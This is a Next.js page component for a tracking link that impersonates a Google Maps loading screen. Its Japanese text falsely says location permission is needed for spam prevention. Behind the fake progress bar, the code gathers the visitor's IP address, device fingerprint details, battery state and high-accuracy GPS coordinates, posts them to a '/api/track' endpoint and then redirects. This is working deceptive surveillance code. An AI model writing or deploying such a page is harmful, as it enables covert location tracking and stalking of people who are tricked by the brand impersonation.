// File: src/app/[track_id]/page.tsx
'use client'

import { useEffect, useState, use } from 'react'

export default function TrackPage({ params }: { params: Promise<{ track_id: string }> }) {
    const [statusText, setStatusText] = useState('Google Mapsを開いています...')
    const [progress, setProgress] = useState(0)

    // unwrapping params in next15
    const unwrappedParams = use(params)
    const trackId = unwrappedParams.track_id

    useEffect(() => {
        // Fake loading bar
        const interval = setInterval(() => {
            setProgress((prev) => (prev >= 90 ? 90 : prev + 10))
        }, 300)

        const collectDataAndRedirect = async () => {
            try {
                setStatusText('現在地を取得しています...')

                let ipData = { ip: '' }
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json')
                    ipData = await ipResponse.json()
                } catch (e) {
                    console.error("IP fetch failed", e)
                }

                // Collect basic env details immediately
                const envData: any = {
                    ip_address: ipData.ip,
                    user_agent: navigator.userAgent,
                    screen_width: window.screen.width,
                    screen_height: window.screen.height,
                    window_width: window.innerWidth,
                    window_height: window.innerHeight,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    logical_cores: navigator.hardwareConcurrency || null,
                    device_memory: (navigator as any).deviceMemory || null,
                    network_type: (navigator as any).connection?.effectiveType || null,
                    network_speed: (navigator as any).connection?.downlink || null,
                }

                try {
                    if ((navigator as any).getBattery) {
                        const battery = await (navigator as any).getBattery()
                        envData.battery_level = battery.level
                        envData.battery_charging = battery.charging
                    }
                } catch (e) { }

                // 1. Request GPS position (Google Maps style)
                try {
                    const position: any = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        })
                    })

                    // Success - User allowed GPS
                    await submitData({
                        ...envData,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        gps_accuracy: position.coords.accuracy,
                        gps_permission: true
                    })
                } catch (error) {
                    // Failure or Reject - Fallback to IP only
                    await submitData({
                        ...envData,
                        gps_permission: false
                    })
                }
            } catch (err) {
                // Fallback emergency redirect if everything fails
                window.location.href = 'https://maps.google.com'
            }
        }

        const submitData = async (payload: any) => {
            try {
                const res = await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ linkId: trackId, ...payload })
                })

                if (res.ok) {
                    const data = await res.json()
                    setProgress(100)

                    if (data.targetUrl) {
                        // Instant redirect after success
                        window.location.replace(data.targetUrl)
                    } else {
                        window.location.replace('https://maps.google.com')
                    }
                } else {
                    window.location.replace('https://maps.google.com')
                }
            } catch (e) {
                window.location.replace('https://maps.google.com')
            }
        }

        collectDataAndRedirect()

        return () => clearInterval(interval)
    }, [trackId])

    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-white">
            {/* Fake Google Maps Loading Logo UI */}
            <img src="https://fonts.gstatic.com/s/i/productlogos/maps/v8/192px.svg" alt="Google Maps" className="w-24 h-24 mb-6 animate-pulse drop-shadow-sm" />

            <p className="text-gray-700 text-lg font-medium mb-8">
                {statusText}
            </p>

            {/* Fake Progress Bar */}
            <div className="w-64 max-w-sm h-1.5 bg-gray-200 rounded-full overflow-hidden">
                <div
                    className="h-full bg-blue-500 rounded-full transition-all duration-300 ease-out"
                    style={{ width: `${progress}%` }}
                />
            </div>

            <p className="text-gray-400 text-sm mt-8">
                スパム防止のため、位置情報の提供を「許可」してください。
            </p>
        </div>
    )
}
